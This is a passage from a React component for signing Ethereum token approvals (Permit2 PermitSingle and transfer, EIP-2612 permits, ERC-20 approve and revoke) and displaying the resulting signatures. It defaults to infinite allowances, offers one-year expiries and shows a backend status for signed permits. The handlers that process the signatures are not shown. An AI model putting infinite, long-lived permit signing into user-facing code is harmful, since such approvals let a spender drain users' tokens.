              <span className="text-[10px] text-text-secondary font-sans">Permit2 Standard Infinite</span>
            </div>
          ) : (
            <input
              type="text"
              value={tokenAmount}
              onChange={(e) => setTokenAmount(e.target.value)}
              className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main outline-none focus:border-[#00A3FF]"
              placeholder="1000.0"
            />
          )}
        </div>

        <div>
          <div className="flex justify-between items-center mb-1 text-xs">
            <span className="font-semibold text-text-secondary">Permit Expiration</span>
            <div className="flex items-center gap-1.5">
              <button
                type="button"
                onClick={() => setDeadlineMinutes("43200")} // 30 days
                className="text-[10px] text-[#00A3FF] hover:underline"
              >
                30 Days
              </button>
              <button
                type="button"
                onClick={() => setDeadlineMinutes("525600")} // 1 year
                className="text-[10px] text-[#00A3FF] hover:underline"
              >
                1 Year
              </button>
            </div>
          </div>
          <input
            type="number"
            value={deadlineMinutes}
            onChange={(e) => setDeadlineMinutes(e.target.value)}
            className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main outline-none focus:border-[#00A3FF]"
            placeholder="Minutes (e.g. 43200 for 30 days)"
          />
        </div>
      </div>

      {/* Action Buttons Based on Selected Mode */}
      <div className="space-y-3 pt-2">
        {activeTab === "permit2_allowance" && (
          <div className="space-y-2">
            <div className="flex flex-col sm:flex-row gap-3">
              <button
                type="button"
                disabled={isProcessing}
                onClick={handlePermit2AllowanceSignature}
                className="flex-1 py-3 px-4 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs shadow-lg shadow-purple-600/20 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {isProcessing ? (
                  <RefreshCw className="w-4 h-4 animate-spin" />
                ) : (
                  <Zap className="w-4 h-4" />
                )}
                Sign Permit2 Allowance (PermitSingle EIP-712)
              </button>

              {signatureOutput && (
                <button
                  type="button"
                  disabled={isProcessing}
                  onClick={handleExecutePermit2OnChain}
                  className="py-3 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  <ArrowUpRight className="w-4 h-4" />
                  Broadcast permit(...) On-Chain
                </button>
              )}
            </div>
            <p className="text-[11px] text-text-secondary text-center">
              Signs an off-chain PermitSingle approval to allow the spender to pull up to the specified amount without gas.
            </p>
          </div>
        )}

        {activeTab === "permit2_transfer" && (
          <button
            type="button"
            disabled={isProcessing}
            onClick={handlePermit2SignatureTransfer}
            className="w-full py-3 px-4 rounded-xl bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 disabled:opacity-50"
          >
            {isProcessing ? (
              <RefreshCw className="w-4 h-4 animate-spin" />
            ) : (
              <ArrowRight className="w-4 h-4" />
            )}
            Sign Single-Use PermitTransferFrom
          </button>
        )}

        {activeTab === "eip2612" && (
          <button
            type="button"
            disabled={isProcessing}
            onClick={signStandardEip2612Permit}
            className="w-full py-3 px-4 rounded-xl bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 disabled:opacity-50"
          >
            {isProcessing ? (
              <RefreshCw className="w-4 h-4 animate-spin" />
            ) : (
              <FileCheck2 className="w-4 h-4" />
            )}
            Sign Standard EIP-2612 Permit Typed Data
          </button>
        )}

        {activeTab === "erc20_approve" && (
          <div className="flex flex-col sm:flex-row gap-3">
            <button
              type="button"
              disabled={isProcessing}
              onClick={() => handleStandardApprove(false)}
              className="flex-1 py-3 px-4 rounded-xl bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 disabled:opacity-50"
            >
              {isProcessing ? (
                <RefreshCw className="w-4 h-4 animate-spin" />
              ) : (
                <CheckCircle2 className="w-4 h-4" />
              )}
              Execute Direct On-Chain approve(...)
            </button>
            <button
              type="button"
              disabled={isProcessing}
              onClick={() => handleStandardApprove(true)}
              className="py-3 px-4 rounded-xl bg-red-600/80 hover:bg-red-600 text-white font-bold text-xs shadow-md transition-all flex items-center justify-center gap-2 disabled:opacity-50"
            >
              Revoke Allowance (Approve 0)
            </button>
          </div>
        )}
      </div>

      {/* Live Status Output Notification */}
      {status && (
        <div className="p-3.5 bg-input border border-border-main rounded-xl text-xs flex items-start gap-2.5">
          <Info className="w-4 h-4 text-[#00A3FF] shrink-0 mt-0.5" />
          <div className="space-y-1">
            <span className="font-semibold text-text-main block">{status}</span>
            {txHash && (
              <a
                href={`https://etherscan.io/tx/${txHash}`}
                target="_blank"
                rel="noreferrer"
                className="text-[11px] text-[#00A3FF] hover:underline flex items-center gap-1 font-mono"
              >
                View on Etherscan: {txHash.slice(0, 16)}... <ExternalLink className="w-3 h-3" />
              </a>
            )}
          </div>
        </div>
      )}

      {errorMsg && (
        <div className="p-3.5 bg-red-500/10 border border-red-500/20 rounded-xl text-xs flex items-start gap-2.5 text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span className="font-mono">{errorMsg}</span>
        </div>
      )}

      {/* Complete Generated Signature Inspector (v, r, s, JSON, Telemetry) */}
      {signatureOutput && (
        <div className="p-4 bg-input/60 rounded-xl border border-border-main space-y-4 animate-in fade-in duration-200">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-border-main pb-3">
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-purple-400" />
              <span className="text-xs font-bold text-text-main">
                {signatureOutput.type} Output
              </span>
              {signatureOutput.backendStatus && (
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono">
                  {signatureOutput.backendStatus}
                </span>
              )}
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => copyToClipboard(JSON.stringify(signatureOutput, null, 2), "json")}
                className="text-[11px] text-[#00A3FF] hover:underline flex items-center gap-1"
              >
                {copiedField === "json" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                {copiedField === "json" ? "Copied!" : "Copy Full JSON"}
              </button>
            </div>
          </div>

          {/* Cryptographic Parameters Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 font-mono text-[11px]">
            <div className="p-2.5 bg-background rounded-lg border border-border-main">
              <span className="text-text-secondary block text-[10px]">v:</span>
              <span className="text-text-main font-bold">{signatureOutput.v}</span>
            </div>
            <div className="p-2.5 bg-background rounded-lg border border-border-main overflow-hidden">
              <span className="text-text-secondary block text-[10px]">r:</span>
              <span className="text-text-main font-bold truncate block">{signatureOutput.r}</span>
            </div>
            <div className="p-2.5 bg-background rounded-lg border border-border-main overflow-hidden">
              <span className="text-text-secondary block text-[10px]">s:</span>
              <span className="text-text-main font-bold truncate block">{signatureOutput.s}</span>
            </div>
          </div>

          {/* Full Raw Signature */}
          <div className="p-3 bg-background rounded-lg border border-border-main font-mono text-[11px] break-all relative">
            <div className="flex items-center justify-between mb-1">
              <span className="text-text-secondary text-[10px]">Raw Signature Hash:</span>
              <button
                type="button"
                onClick={() => copyToClipboard(signatureOutput.rawSignature, "sig")}
                className="text-[10px] text-[#00A3FF] hover:underline flex items-center gap-1 font-sans"
              >
                {copiedField === "sig" ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
                {copiedField === "sig" ? "Copied" : "Copy Sig"}
              </button>
            </div>
            <span className="text-purple-400">{signatureOutput.rawSignature}</span>
          </div>

          {/* PermitSingle Breakdown */}
          {signatureOutput.permitSinglePayload && (
            <div className="p-3 bg-background/80 rounded-lg border border-border-main text-[11px] font-mono space-y-1">
              <span className="text-text-secondary text-[10px] block font-sans font-bold">PermitSingle Tuple Details:</span>
              <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[10px]">
                <div><span className="text-text-secondary">Token:</span> {signatureOutput.permitSinglePayload.details.token}</div>
                <div><span className="text-text-secondary">Amount:</span> {signatureOutput.permitSinglePayload.details.amount}</div>
                <div><span className="text-text-secondary">Expiration:</span> {signatureOutput.permitSinglePayload.details.expiration}</div>
                <div><span className="text-text-secondary">Nonce:</span> {signatureOutput.permitSinglePayload.details.nonce}</div>
                <div><span className="text-text-secondary">Spender:</span> {signatureOutput.permitSinglePayload.spender}</div>
                <div><span className="text-text-secondary">Sig Deadline:</span> {signatureOutput.permitSinglePayload.sigDeadline}</div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
